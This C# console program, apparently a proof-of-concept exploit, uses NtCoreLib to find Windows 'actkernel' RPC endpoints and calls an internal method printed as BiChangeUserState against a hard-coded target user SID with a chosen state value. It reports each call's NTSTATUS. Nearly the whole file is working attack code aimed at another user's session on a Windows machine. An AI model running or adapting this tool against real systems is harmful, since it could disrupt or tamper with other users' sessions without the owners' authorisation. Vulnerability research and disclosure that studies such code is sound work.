using System.Security.Principal;
using NtCoreLib.Ndr.Rpc;
using NtCoreLib.Win32.Rpc.EndpointMapper;
using NtCoreLib.Win32.Rpc.Transport;
using rpc_8bfc3be1_6def_4e2d_af74_7c47cd0ade4a_1_0;

namespace ConsoleApp1
{
    internal class Program
    {
        private const short State = 1;

        static int Main(string[] args)
        {
            try
            {
                string targetSid = "S-1-5-21-1533898502-3188944542-3165517739-1001"; // target sid

                var ifUuid = new Guid("8bfc3be1-6def-4e2d-af74-7c47cd0ade4a");
                var syntax = new RpcSyntaxIdentifier(ifUuid, 1, 0);

                var endpoints = RpcEndpointMapper.QueryEndpointsForInterface(null, syntax);

                var selectedEndpoints = endpoints
                    .Where(e => e.Binding.ToString().Contains("actkernel", StringComparison.OrdinalIgnoreCase))
                    .ToList();

                if (selectedEndpoints.Count == 0)
                {
                    Console.WriteLine("[-] could not find any actkernel endpoints.");
                    return 2;
                }

                var sidBytes = SidStringToBytes(targetSid, out var printableSid);
                int sidLength = sidBytes.Length;
                var stateEnum = new NtCoreLib.Ndr.Marshal.NdrEnum16(State);

                foreach (var endpoint in selectedEndpoints)
                {
                    Console.WriteLine($"[*] Endpoint: {endpoint.Binding}");
                    using var client = new Client();

                    var security = new RpcTransportSecurity
                    {
                        AuthenticationLevel = RpcAuthenticationLevel.Call
                    };

                    client.Connect(endpoint, security, null);

                    Console.WriteLine($"[i] Calling BiChangeUserState for SID {printableSid} (len={sidLength}), state={State}...");
                    uint status = client.PsmBiExtServerCleanup_2(sidBytes, sidLength, stateEnum);
                    Console.WriteLine($"[+] BiChangeUserState returned NTSTATUS 0x{status:X8}\n");
                }

                return 0;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex}");
                return 99;
            }
        }

        private static byte[] SidStringToBytes(string sidString, out string printableSid)
        {
            var sidObj = new SecurityIdentifier(sidString);
            var bytes = new byte[sidObj.BinaryLength];
            sidObj.GetBinaryForm(bytes, 0);
            printableSid = sidObj.Value;
            return bytes;
        }
    }
}
